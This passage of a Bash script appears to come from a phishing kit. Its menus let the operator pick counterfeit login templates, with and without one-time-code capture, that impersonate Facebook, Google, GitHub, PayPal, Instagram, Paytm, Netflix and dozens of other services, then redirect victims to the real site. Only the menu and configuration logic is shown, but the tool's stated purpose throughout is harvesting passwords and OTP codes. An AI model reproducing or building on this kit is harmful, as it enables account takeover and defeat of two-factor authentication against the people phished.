        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="facebook"
                        capture_type="NOTP"
                        site_template="Default"
                        dgfname="facebook" ;;
                2 | 02)
                        site_id="facebook/otp"
                        capture_type="POTP"
                        site_template="OTP"
                        dgfname="facebook" ;;
                3 | 03)
                        site_id="fb_poll"
                        capture_type="NOTP"
                        rdurl="result.html"
                        site_template="Poll"
                        dgfname="fb_poll" ;;
                4 | 04)
                        site_id="fb_poll/otp"
                        capture_type="POTP"
                        rdurl="result.html"
                        site_template="Poll/OTP"
                        dgfname="fb_poll" ;;
                5 | 05)
                        site_id="fb_security"
                        capture_type="NOTP"
                        site_template="Security"
                        dgfname="fb_security" ;;
                6 | 06)
                        site_id="fb_security/otp"
                        capture_type="POTP"
                        site_template="Security/OTP"
                        dgfname="fb_security" ;;
                7 | 07)
                        site_id="fb_standard"
                        capture_type="NOTP"
                        site_template="Standard"
                        dgfname="fb_standard" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_facebook; };;
        esac
}
#flipcart
login_flipcart(){
        site_name="Flipcart"
        dgfname="flipcart"
        rdurl="www.flipcart.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="flipcart"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="flipcart/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                                { sleep 1; banner; login_flipcart; };;
        esac
}
#freefire
login_freefire(){
        site_id="freefire"
        dgfname="freefire"
        rdurl="ff.garena.com"
        site_name="Free Fire"
        capture_type="NOTP"
        site_template="Default"
}
#github
login_github(){
        site_name="GitHub"
        rdurl="www.github.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
        echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="github"
                        capture_type="NOTP"
                        site_template="Default"
                        dgfname="github" ;;
                2 | 02)
                        site_id="github/otp"
                        capture_type="POTP"
                        site_template="OTP"
                        dgfname="github" ;;
                3 | 03)
                        site_id="github_advanced"
                        capture_type="NOTP"
                        site_template="Advanced"
                        dgfname="github_advanced" ;;
                4 | 04)
                        site_id="github_advanced/otp"
                        capture_type="POTP"
                        site_template="Advanced/OTP"
                        dgfname="github_advanced" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_github; };;
        esac
}
#gitlab
login_gitlab(){
        site_name="GitLab"
        rdurl="www.gitlab.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
        echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="gitlab"
                        capture_type="NOTP"
                        site_template="Default"
                        dgfname="gitlab" ;;
                2 | 02)
                        site_id="gitlab/otp"
                        capture_type="POTP"
                        site_template="OTP"
                        dgfname="gitlab" ;;
                3 | 03)
                        site_id="gitlab_advanced"
                        capture_type="NOTP"
                        site_template="Advanced"
                        dgfname="gitlab_advanced" ;;
                4 | 04)
                        site_id="gitlab_advanced/otp"
                        capture_type="POTP"
                        site_template="OTP"
                        dgfname="gitlab_advanced" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_gitlab; };;
        esac
}
#gmail
login_gmail(){
        site_name="Gmail"
        dgfname="gmail"
        rdurl="www.gmail.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="gmail"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="gmail/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_gmail; };;
        esac
}
#google
login_google(){
        site_name="Google"
        rdurl="www.gmail.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} Google - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} Google - WITH OTP ${NC}"
        echo -e "${BLUE}[03]${CYAN} Google Poll - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[04]${CYAN} Google Poll - WITH OTP ${NC}"
        echo -e "${BLUE}[05]${CYAN} Google old - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[06]${CYAN} Google old - WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="google"
                        capture_type="NOTP"
                        site_template="Default"
                        dgfname="google" ;;
                2 | 02)
                        site_id="google/otp"
                        capture_type="POTP"
                        site_template="OTP"
                        dgfname="google" ;;
                3 | 03)
                        site_id="google_poll"
                        capture_type="NOTP"
                        rdurl="result.html"
                        site_template="Poll"
                        dgfname="google_poll" ;;
                4 | 04)
                        site_id="google_poll/otp"
                        capture_type="POTP"
                        rdurl="result.html"
                        site_template="Poll/OTP"
                        dgfname="google_poll" ;;
                5 | 05)
                        site_id="google_old"
                        capture_type="NOTP"
                        site_template="Old"
                        dgfname="google_old" ;;
                6 | 06)
                        site_id="google_old/otp"
                        capture_type="POTP"
                        site_template="Old/OTP"
                        dgfname="google_old" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_google; };;
        esac
}
#gpay
login_gpay(){
        site_name="Gpay"
        dgfname="gpay"
        rdurl="pay.google.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="gpay"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="gpay/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_gpay; };;
        esac
}
#icloud
login_icloud(){
        site_id="icloud"
        rdurl="www.icloud.com/"
        site_name="iCloud"
        dgfname="icloud"
        capture_type="NOTP"
        site_template="Default"
}
#instagram
login_instagram(){
        site_name="Instagram"
        rdurl="www.instagram.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} Instagram - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} Instagram - WITH OTP ${NC}"
        echo -e "${BLUE}[03]${CYAN} Instagram Advanced - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[04]${CYAN} Instagram Advanced - WITH OTP ${NC}"
        echo -e "${BLUE}[05]${CYAN} Instagram Autoliker - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[06]${CYAN} Instagram Autoliker- WITH OTP ${NC}"
        echo -e "${BLUE}[07]${CYAN} Instagram Followers - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[08]${CYAN} Instagram Followers - WITH OTP ${NC}"
        echo -e "${BLUE}[09]${CYAN} Instagram Verify - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[10]${CYAN} Instagram Old - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[11]${CYAN} Instagram Old - WITH OTP ${NC}"
        echo -e "${BLUE}[12]${CYAN} Instagram Video - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="instagram"
                        capture_type="NOTP"
                        site_template="Default"
                        dgfname="instagram" ;;
                2 | 02)
                        site_id="instagram/otp"
                        capture_type="POTP"
                        site_template="OTP"
                        dgfname="instagram" ;;
                3 | 03)
                        site_id="ig_advanced"
                        capture_type="NOTP"
                        site_template="Advanced"
                        dgfname="ig_advanced" ;;
                4 | 04)
                        site_id="ig_advanced/otp"
                        capture_type="POTP"
                        site_template="Advanced/OTP"
                        dgfname="ig_advanced" ;;
                5 | 05)
                        site_id="ig_autoliker"
                        capture_type="NOTP"
                        site_template="Autoliker"
                        dgfname="ig_autoliker" ;;
                6 | 06)
                        site_id="ig_autoliker/otp"
                        capture_type="POTP"
                        site_template="Autoliker/OTP"
                        dgfname="ig_autoliker" ;;
                7 | 07)
                        site_id="ig_followers"
                        capture_type="NOTP"
                        site_template="Followers"
                        dgfname="ig_followers" ;;
                8 | 08)
                        site_id="ig_followers/otp"
                        capture_type="POTP"
                        site_template="Followers/OTP"
                        dgfname="ig_followers" ;;
                9 | 09)
                        site_id="ig_verify"
                        capture_type="NOTP"
                        rdurl="login3.html"
                        site_template="Verify"
                        dgfname="ig_verify" ;;
                10)
                        site_id="ig_old"
                        capture_type="NOTP"
                        site_template="Old"
                        dgfname="ig_old" ;;
                11)
                        site_id="ig_old/otp"
                        capture_type="POTP"
                        site_template="Old/OTP"
                        dgfname="ig_old" ;;
                12)
                        site_id="ig_video"
                        capture_type="NOTP"
                        site_template="Video"
                        dgfname="ig_video" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_instagram; };;
        esac
}
#jazz
login_jazz(){
        site_id="jazz"
        rdurl="jazz.com.pk/"
        site_name="Jazz"
        dgfname="jazz"
        capture_type="OOTP"
        site_template="Default"
}
#jio
login_jio(){
        site_name="JIO"
        rdurl="www.jio.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} SIM ${NC}"
        echo -e "${BLUE}[02]${CYAN} Offer ${NC}"
        echo -e "${BLUE}[03]${CYAN} Router - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[04]${CYAN} Router - WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="jiosim"
                        capture_type="OOTP"
                        site_template="Sim"
                        dgfname="jiosim" ;;
                2 | 02)
                        site_id="jiooffer"
                        capture_type="NOTP"
                        site_template="Offer"
                        dgfname="jiooffer" ;;
                3 | 03)
                        site_id="jiorouter"
                        rdurl="www.jio.com/business/jiofi"
                        capture_type="NOTP"
                        site_template="Default" ;;
                4 | 04)
                        site_id="jiorouter/otp"
                        capture_type="POTP"
                        rdurl="www.jio.com/business/jiofi"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_jio; };;
        esac
}
#linkedin
login_linkedin(){
        site_name="Linkedin"
        dgfname="linkedin"
        rdurl="linkedin.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="linkedin"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="linkedin/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_linkedin; };;
        esac
}
#mediafire
login_mediafire(){
        site_name="Medifire"
        dgfname="mediafire"
        rdurl="www.mediafire.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="mediafire"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="mediafire/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_mediafire; };;
        esac
}
#messenger
login_messenger(){
        site_name="Messenger"
        rdurl="www.messenger.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} Messenger - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} Messenger - WITH OTP ${NC}"
        echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[04]${CYAN} Messenger old - WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="messenger"
                        capture_type="NOTP"
                        site_template="Default"
                        dgfname="messenger" ;;
                2 | 02)
                        site_id="messenger/otp"
                        capture_type="POTP"
                        site_template="OTP"
                        dgfname="messenger" ;;
                3 | 03)
                        site_id="messenger_old"
                        capture_type="NOTP"
                        site_template="Old"
                        dgfname="messenger_old" ;;
                4 | 04)
                        site_id="messenger_old/otp"
                        capture_type="POTP"
                        site_template="Old/OTP"
                        dgfname="messenger_old" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_messenger; };;
        esac
}
#microsoft
login_microsoft(){
        site_name="Microsoft"
        dgfname="microsoft"
        rdurl="www.microsoft.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="microsoft"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="microsoft/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_microsoft; };;
        esac
}
#mobiwik
login_mobiwik(){
        site_id="mobiwik"
        rdurl="www.mobikwik.com/"
        site_name="Mobiwik"
        dgfname="mobiwik"
        capture_type="OOTP"
        site_template="Default"
}
#myspace
login_myspace(){
        site_name="MySpace"
        dgfname="myspace"
        rdurl="myspace.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="myspace"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="myspace/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_myspace; };;
        esac
}
#netflix
login_netflix(){
        site_name="Netflix"
        dgfname="netflix"
        rdurl="www.netflix.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="netflix"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="netflix/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_netflix; };;
        esac
}
#ola
login_ola(){
        site_id="ola"
        rdurl="www.olacabs.com/"
        site_name="OLA"
        dgfname="ola"
        capture_type="OOTP"
        site_template="Default"
}
#origin
login_origin(){
        site_id="origin"
        rdurl="origin.onl"
        site_name="Origin"
        dgfname="origin"
        capture_type="NOTP"
        site_template="Default"
}
#paypal
login_paypal(){
        site_name="Paypal"
        dgfname="paypal"
        rdurl="www.paypal.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="paypal"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="paypal/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_paypal; };;
        esac
}
#paytm
login_paytm(){
        site_name="Paytm"
        rdurl="paytm.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} Paytm - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} Paytm - WITH OTP ${NC}"
        echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[04]${CYAN} Paytm Offer - WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="paytm"
                        capture_type="NOTP"
                        site_template="Default"
                        dgfname="paytm" ;;
                2 | 02)
                        site_id="paytm/otp"
                        capture_type="POTP"
                        site_template="OTP"
                        dgfname="paytm" ;;
                3 | 03)
                        site_id="paytmoffer"
                        capture_type="NOTP"
                        site_template="Offer"
                        dgfname="paytmoffer" ;;
                4 | 04)
                        site_id="paytmoffer/otp"
                        capture_type="POTP"
                        site_template="Offer/OTP"
                        dgfname="paytmoffer" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_paytm; };;
        esac
}
#phonepe
login_phonepe(){
        site_id="phonepe"
        rdurl="www.phonepe.com/"
        site_name="phonepe"
        dgfname="phonepe"
        capture_type="OOTP"
        site_template="Default"
}
#origin
login_pinterest(){
        site_id="pinterest"
        rdurl="pinterest.com/"
        site_name="Pinterest"
        dgfname="pinterest"
        capture_type="NOTP"
        site_template="Default"
}
#playstation
login_playstation(){
        site_name="PlayStation"
        rdurl="www.playstation.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} Playstation 1 - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
        echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="playstation"
                        capture_type="NOTP"
                        site_template="Default"
                        dgfname="playstation" ;;
                2 | 02)
                        site_id="playstation/otp"
                        capture_type="POTP"
                        site_template="OTP"
                        dgfname="playstation" ;;
                3 | 03)
                        site_id="playstation2"
                        capture_type="NOTP"
                        site_template="2"
                        dgfname="playstation2" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_playstation; };;
        esac
}
#protonmail
login_protonmail(){
        site_name="Proton Mail"
        dgfname="protonmail"
        rdurl="proton.me/"
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="protonmail"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="protonmail/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_protonmail; };;
        esac
}
#pubg
login_pubg(){
        site_id="pubg"
        rdurl="www.pubgmobile.com/"
        site_name="PUBG"
        dgfname="pubg"
        capture_type="NOTP"
        site_template="Old"
}
#quora
login_quora(){
        site_id="quora"
        dgfname="quora"
        rdurl="www.quora.com/"
        site_name="Quora"
        capture_type="NOTP"
        site_template="Default"
}
#reddit
login_reddit(){
        site_name="Reddit"
        rdurl="www.reddit.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
        echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="reddit"
                        capture_type="NOTP"
                        site_template="Default"
                        dgfname="reddit" ;;
                2 | 02)
                        site_id="reddit_old"
                        capture_type="NOTP"
                        site_template="Old"
                        dgfname="reddit_old" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_reddit; };;
        esac
}
#shopify
login_shopify(){
        site_name="Shopify"
        dgfname="shopify"
        rdurl="www.shopify.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="shopify"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="shopify/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_shopify; };;
        esac
}
#snapchat
login_snapchat(){
        site_name="Snapchat"
        dgfname="snapchat"
        rdurl="www.snapchat.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="snapchat"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="snapchat/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_snapchat; };;
        esac
}
#socialclub
login_socialclub(){
        site_name="SocialClub"
        dgfname="socialclub"
        rdurl="socialclub.rockstargames.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="socialclub"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="socialclub/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_socialclub; };;
        esac
}
#spotify
login_spotify(){
        site_name="Spotify"
        dgfname="spotify"
        rdurl="www.spotify.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="spotify"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="spotify/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_spotify; };;
        esac
}
#stackoverflow
login_stackoverflow(){
        site_name="Stackoverflow"
        dgfname="stackoverflow"
        rdurl="stackoverflow.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="stackoverflow"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="stackoverflow/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_stackoverflow; };;
        esac
}
#steam
login_steam(){
        site_name="Steam"
        dgfname="steam"
